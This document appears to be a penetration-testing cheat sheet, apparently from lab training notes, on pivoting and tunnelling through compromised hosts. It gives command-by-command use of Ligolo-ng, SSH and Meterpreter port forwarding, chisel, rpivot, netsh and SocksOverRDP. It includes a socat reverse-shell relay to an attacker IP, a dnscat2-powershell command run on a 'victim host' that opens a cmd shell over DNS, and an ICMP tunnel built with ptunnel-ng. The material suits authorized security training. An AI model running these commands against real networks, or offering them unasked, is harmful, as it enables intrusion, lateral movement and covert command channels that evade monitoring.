
# Ligolo-ng

```bash
# Terminal 1 - Ligolo server
sudo ./proxy -selfcert
# In ligolo console:
ifcreate --name ligolo
route_add --name ligolo --route 192.168.2.0/24

# access local services
route_add --name ligolo --route 240.0.0.1/32

listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
```

# SSH

## Dynamic Port Forwarding

```bash
# Forwarind two local ports 1234 & 8080
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Dynamic port forward
ssh -D 9050 ubuntu@10.129.202.64

netstat -antp | grep 1234
tail -4 /etc/proxychains.conf
```

## Reverse Port Forwarding

```bash
# forward pivothost's port 8080 to local port 8000
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

# Sshuttle

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

# Meterpreter

## Ping Sweep

### Meterpreter

```bash
# Perform an ICMP sweep through the Meterpreter pivot session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### Linux

```bash
# Ping every address in the target subnet from a Linux pivot host
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done
```

### Windows

```powershell
# Ping every address in the target subnet from a Windows CMD pivot host
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### PowerShell

```powershell
# Ping every address in the target subnet from a PowerShell pivot host
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.5.$($_) -Quiet)"}
```

## Configure the Metasploit SOCKS Proxy

```bash
# Select the SOCKS proxy module
use auxiliary/server/socks_proxy

# Set the local SOCKS proxy port
set SRVPORT 9050

# Listen on all local interfaces
set SRVHOST 0.0.0.0

# Configure SOCKS version 4a
set VERSION 4a

# Start the SOCKS proxy as a background job
run

# Need to configure proxychains.conf if needed
```

## AutoRoute Module

```bash
# Select the AutoRoute post-exploitation module
use post/multi/manage/autoroute

# Select the Meterpreter session
set SESSION 1

# Configure Subnet
set SUBNET 172.16.5.0

run
```

```bash
# another way
run autoroute -s 172.16.5.0/23

# Listing active routes
run autoroute -p
```

## Port Forward

```bash
# Creating Local TCP Relay
# forward all traffic from local:3300 to remoteIP:3389
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

### Reverse Port Forward

```bash
# Reverse Port Forwarding Rules
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

# Socat

```bash
# Reverse Shell Relay
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

# Port Forwarding (Easy way)
# The compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

# Port Forwarding (Quiet way)
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & (# run on local attacking machine)
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

# Plink (Windows)

- https://www.proxifier.com/

```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

# Rpivot

```bash
git clone https://github.com/klsecservices/rpivot.git

# Running server.py from the Attack Host
# configure proxychains to proxy-port 9050 & socks4
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transferring rpivot to the Target
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

# Running client.py from Pivot Target
python2 client.py --server-ip 10.10.14.18 --server-port 9999

# Confirming Connection is Established
New connection from host 10.129.202.64, source port 35226
```

```bash
# Connecting to a Web Server using HTTP-Proxy & NTLM Auth
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# Netsh (Windows)

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

```powershell
# PortForward
# listenaddress must be IP exposed to our attack host network
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

# Verify
netsh.exe interface portproxy show v4tov4
```

# DNS Tunneling with Dnscat2

```bash
# setup
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo apt update
sudo apt install ruby ruby-dev libffi-dev build-essential
gem install --user-install bundler
bundle config set --local path .bundle
bundle install

# start dnscat2 server (attack host)
# host is our own kali IP
sudo bundle exec ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

**dnscat2 Client Authentication**

- Start the **dnscat2 server** → it generates a **secret key**.
- Provide this key to the **Windows dnscat2 client** to authenticate and encrypt tunnel traffic.
- On Windows, use either:
    - **dnscat2 client** from the main project
    - **dnscat2-powershell** — PowerShell-based compatible client (provided link below)
- Transfer the client to the Windows target and connect it to the external dnscat2 server.

```powershell
# victim host - dnscat2-powershell
git clone https://github.com/lukebaggett/dnscat2-powershell.git

Import-Module .\dnscat2.ps1

# if not work, check key mentioned above
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

```bash
# Interacting with the Established Session
dnscat2> window -i 1
```

# SOCKS5 Tunneling with Chisel

**Note:** If you are getting an error message with chisel on the target, try with a [different version](https://github.com/jpillora/chisel/releases).

```bash
git clone https://github.com/jpillora/chisel.git

wget https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz
gunzip chisel_1.11.8_linux_amd64.gz
chmod +x chisel_1.11.8_linux_amd64
mv chisel_1.11.8_linux_amd64 chisel

# Running the Chisel Server on the Pivot Host
# proxychains need to be socks5 127.0.0.1 1080
./chisel server -v -p 1234 --socks5

# Connecting to the Chisel Server
./chisel client -v 10.129.202.64:1234 socks
```

## Reverse Pivot

```bash
# Starting the Chisel Server on our Attack Host
sudo ./chisel server --reverse -v -p 1234 --socks5

# Connecting the Chisel Client to our Attack Host
./chisel client -v 10.10.14.17:1234 R:socks
```

# ICMP Tunneling with SOCKS

```bash
git clone https://github.com/utoni/ptunnel-ng.git

sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# binary will be in ptunnel-ng/src
# Transfer to pivot host
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use.

```bash
# Starting the ptunnel-ng Server on the Target Host
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

```bash
# Connecting to ptunnel-ng Server from Attack Host
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

```bash
# Tunneling an SSH connection through an ICMP Tunnel
ssh -p2222 -lubuntu 127.0.0.1
# Enabling Dynamic Port Forwarding over SSH
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

# RDP and SOCKS Tunneling with SocksOverRDP

- https://github.com/nccgroup/SocksOverRDP/releases
- https://www.proxifier.com/download/#win-tab

Download both SocksOverRDP and proxifier to attack host. This case will be double pivot via RDP.

```bash
Kali -> Window (Initial) -> Window (Pivot) -> Window (Target)
```

Frist transfer all files to the initial window machine. Load the dll with the admin privilege.

```powershell
regsvr32.exe SocksOverRDP-Plugin.dll
```

Then, Win + R to call dialog box and type mstsc.exe for RDP connection. Connect to the Pivot host using the credentials (assuming we have). Transfer SocksOverRDP-Server.exe to the pivot window machine and run with the admin privilege.

```powershell
# Verify at initial window machine
netstat -antb | findstr 1080

TCP 127.0.0.1:1080 0.0.0.0:0 LISTENING
```

For proxifier, remember to transfer the whole folder instead of only exe since it requires the dll. Open the proxifier, Click profile, Click proxy servers..., and Add with 127.0.0.1 port 1080. For protocol, use socks4. But can change if that doesn't work. 

We might work with multiple RDP sessions simultaneously. If this is the case, we can access the `Experience` tab in mstsc.exe and set `Performance` to `Modem`.